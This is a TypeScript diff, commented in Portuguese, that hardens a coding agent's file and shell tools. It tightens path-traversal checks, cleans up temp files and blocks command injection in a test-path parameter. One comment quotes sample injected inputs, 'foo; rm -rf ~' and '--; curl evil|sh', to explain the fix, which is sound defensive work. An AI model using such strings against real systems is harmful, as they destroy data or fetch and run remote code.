@@ -23,16 +23,25 @@ function resolveSafePath(rawPath: string): string {
   }
   const root = getLioraWorkspaceRoot();
   const resolved = path.resolve(root, trimmed);
-  if (!resolved.startsWith(root)) {
+  // Prefixo simples (startsWith) permitiria pastas irmãs (ex: root=ws, alvo=ws-evil);
+  // exigimos que o restante comece com o separador do SO ou que seja a própria raiz.
+  if (resolved !== root && !resolved.startsWith(root + path.sep)) {
     throw new Error('PATH_TRAVERSAL_BLOCKED: O caminho resolvido escapou da raiz do workspace.');
   }
   return resolved;
 }
 
 /** Executa comando real via child_process com timeout e sem vazar processos */
-function execCommand(cmd: string, timeoutMs: number): Promise<{ stdout: string; stderr: string; exitCode: number }> {
+function execCommand(cmd: string, timeoutMs: number, customCwd?: string): Promise<{ stdout: string; stderr: string; exitCode: number }> {
+  let cwd = customCwd;
+  if (!cwd) {
+    const ws = getLioraWorkspaceRoot();
+    cwd = (fs.existsSync(ws) && (fs.existsSync(path.join(ws, 'package.json')) || fs.existsSync(path.join(ws, '.git'))))
+      ? ws
+      : process.cwd();
+  }
   return new Promise((resolve) => {
-    exec(cmd, { timeout: timeoutMs, windowsHide: true }, (err, stdout, stderr) => {
+    exec(cmd, { cwd, timeout: timeoutMs, windowsHide: true }, (err, stdout, stderr) => {
       const exitCode = err && typeof (err as any).code === 'number' ? (err as any).code : (err ? 1 : 0);
       resolve({ stdout: stdout || '', stderr: stderr || '', exitCode });
     });
@@ -211,6 +220,9 @@ export const codeReadFileTool: ToolDefinition<{
     const totalLines = allLines.length;
 
     const start = Math.max(1, startLine);
+    if (endLine !== undefined && endLine < start) {
+      throw new Error(`INVALID_RANGE: endLine (${endLine}) não pode ser menor que startLine (${start}).`);
+    }
     const end = endLine ? Math.min(totalLines, endLine) : Math.min(totalLines, start + maxLines - 1);
 
     const sliced = allLines.slice(start - 1, end).map((text, idx) => ({
@@ -281,10 +293,17 @@ export const codeApplyPatchTool: ToolDefinition<{
     const occurrences = content.split(target).length - 1;
     const updated = content.replace(target, replacement);
 
-    // Gravação segura via arquivo temporário
+    // Gravação segura via arquivo temporário com limpeza no catch
     const tmpPath = `${safePath}.tmp.${Date.now()}`;
-    fs.writeFileSync(tmpPath, updated, 'utf-8');
-    fs.renameSync(tmpPath, safePath);
+    try {
+      fs.writeFileSync(tmpPath, updated, 'utf-8');
+      fs.renameSync(tmpPath, safePath);
+    } catch (writeErr) {
+      if (fs.existsSync(tmpPath)) {
+        try { fs.unlinkSync(tmpPath); } catch {}
+      }
+      throw writeErr;
+    }
 
     return {
       success: true,
@@ -430,12 +449,33 @@ export const codeRunTestsTool: ToolDefinition<{
   execute: async ({ framework = 'auto', testPath, timeoutMs = 30000 }) => {
     let cmd = 'npm test';
 
+    // CORREÇÃO (injeção de comando): testPath era interpolado diretamente no
+    // comando shell ('cargo test --test ${testPath}' etc.) sem sanitização —
+    // params maliciosos ('foo; rm -rf ~', '--; curl evil|sh') executavam
+    // código arbitrário na máquina do usuário. Agora: caminho validado
+    // estritamente (letras, dígitos, / \\ . _ - e nenhum metacaractere de
+    // shell, sem '..' de traversal) antes da interpolação.
+    let safeTestPath: string | null = null;
+    if (testPath && testPath.trim()) {
+      const candidate = testPath.trim();
+      if (!/^[\w./\\ -]+$/.test(candidate) || candidate.includes('..')) {
+        return {
+          success: false,
+          passed: false,
+          durationMs: 0,
+          error: `INVALID_TEST_PATH: caminho '${candidate.slice(0, 80)}' contém caracteres não permitidos (injeção bloqueada).`,
+          simulated: false
+        };
+      }
+      safeTestPath = candidate;
+    }
+
     if (framework === 'cargo') {
-      cmd = testPath ? `cargo test --test ${testPath}` : 'cargo test';
+      cmd = safeTestPath ? `cargo test --test ${safeTestPath}` : 'cargo test';
     } else if (framework === 'vitest') {
-      cmd = testPath ? `npx vitest run ${testPath}` : 'npx vitest run';
-    } else if (testPath) {
-      cmd = `npx tsx --test ${testPath}`;
+      cmd = safeTestPath ? `npx vitest run ${safeTestPath}` : 'npx vitest run';
+    } else if (safeTestPath) {
+      cmd = `npx tsx --test ${safeTestPath}`;
     }
 
     const startTime = Date.now();
